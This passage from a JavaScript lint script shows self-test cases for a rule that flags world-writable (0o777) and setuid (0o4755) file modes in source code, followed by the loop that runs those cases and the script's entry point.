      const { files, readFile } = fake({ "lib/a.mjs": "mkdirSync(dir, { mode: 0o777 });\n" });
      return checkFileModes(files, readFile).some((v) => v.includes("0o777"));
    }],
    ["a setuid mode fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "chmodSync(path, 0o4755);\n" });
      return checkFileModes(files, readFile).some((v) => v.includes("0o4755"));
    }],
    ["reading permission bits with a mask passes", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "const mode = st.mode & 0o777;\n" });
      return checkFileModes(files, readFile).length === 0;
    }],
  ];
  let failed = 0;
  for (const [name, fn] of cases) {
    let ok = false, error = null;
    try { ok = fn() === true; } catch (e) { error = e.message; }
    console.log(`${ok ? "ok  " : "FAIL"} ${name}${error ? `: ${error}` : ""}`);
    if (!ok) failed++;
  }
  console.log(failed ? `\nself-test FAILED: ${failed} case(s)` : `\nself-test passed: each rule fails on known-bad input (${cases.length} cases)`);
  return failed ? 1 : 0;
}

process.exitCode = process.argv.includes("--self-test") ? selfTest() : main();
